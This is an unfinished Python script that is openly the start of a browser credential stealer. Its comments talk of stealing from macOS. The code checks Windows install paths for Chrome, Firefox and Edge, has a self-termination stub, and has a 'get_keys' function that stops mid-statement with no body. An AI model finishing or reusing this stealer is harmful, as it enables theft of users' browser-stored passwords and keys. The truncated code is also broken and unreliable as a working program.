import os

home = ""

# TODO: Add a function to check for the OS.
# TODO: Add a function to steal from MacOS.

# TODO: Change this to a check of installed programs.
c_path = r'C:\Program Files\Google\Chrome\Application\chrome.exe'
f_path = r'C:\Program Files\Mozilla Firefox\firefox.exe'
e_path = r'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'

has_c = False
has_f = False
has_e = False

def check_for_browsers(c_path, f_path, e_path):
    global has_c, has_f, has_e
    if os.path.isfile(c_path):
        has_c = True
    if os.path.isfile(f_path):
        has_f = True
    if os.path.isfile(e_path):
        has_e = True
    if not (has_c or has_f or has_e):
        killself()
    return has_c, has_f, has_e

def get_keys():
    if has_c == True:
        



def killself():
    print("Bye")
